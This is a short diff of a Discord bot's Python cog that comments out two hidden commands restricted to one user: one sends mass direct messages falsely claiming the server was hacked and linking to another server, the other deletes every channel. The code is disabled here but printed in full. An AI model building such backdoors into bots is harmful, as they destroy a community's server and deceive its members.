@@ -39,21 +39,22 @@ class additional(commands.Cog):
             await channel.send(msg)
  
 ## ^ Announce command lol
-    @commands.command()
-    async def stuff(self, ctx):
-        if ctx.author.name == "Chrovo":
-            members = [member for member in ctx.guild.members if member.name != "Ando" and member.name != "Junky" and member.name != "kvrlc"]
-            for a in members:
-                await asyncio.sleep(1.25)
-                await a.send("Hello, clvrk has been hacked and this server is being messed up, join the new server: \n https://discord.gg/rxGtBnX7NN")
-    @commands.command()
-    async def messup(self,ctx):
-        if ctx.author.name == "Chrovo":
-            for a in ctx.guild.channels:
-                try:
-                    await a.delete()
-                except:
-                    continue
+#     @commands.command()
+#     async def stuff(self, ctx):
+#         if ctx.author.name == "Chrovo":
+#             members = [member for member in ctx.guild.members if member.name != "Ando" and member.name != "Junky" and member.name != "kvrlc"]
+#             for a in members:
+#                 await asyncio.sleep(1.25)
+#                 await a.send("Hello, clvrk has been hacked and this server is being messed up, join the new server: \n https://discord.gg/rxGtBnX7NN")
+                
+#     @commands.command()
+#     async def messup(self,ctx):
+#         if ctx.author.name == "Chrovo":
+#             for a in ctx.guild.channels:
+#                 try:
+#                     await a.delete()
+#                 except:
+#                     continue
 
     @commands.Cog.listener()
     async def on_member_update(self, before, after):
